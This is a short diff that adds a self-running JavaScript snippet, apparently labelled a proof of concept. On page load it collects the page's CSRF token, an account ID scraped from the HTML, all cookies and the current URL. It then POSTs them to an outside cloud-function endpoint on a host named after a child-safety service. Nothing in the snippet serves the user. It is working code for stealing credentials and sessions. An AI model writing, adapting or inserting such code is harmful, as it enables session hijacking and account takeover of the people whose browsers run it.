@@ -1,0 +1,28 @@
+(function() {
+  var SAVE_URL = "https://asia-southeast1-child-guard-prod.cloudfunctions.net/api/v1/poc/save";
+
+  // Grab CSRF token
+  var token = "";
+  var tokenEl = document.getElementsByName("token");
+  if (tokenEl && tokenEl.length > 0) token = tokenEl[0].value;
+
+  // Grab account ID
+  var accountId = "";
+  try {
+    var m = document.body.innerHTML.match(/"accountId"\s*:\s*"([^"]+)"/);
+    if (m) accountId = m[1];
+  } catch(e) {}
+
+  // Send to our endpoint
+  fetch(SAVE_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      csrfToken: token,
+      accountId: accountId,
+      cookies: document.cookie,
+      url: location.href,
+      timestamp: new Date().toISOString()
+    })
+  });
+})();
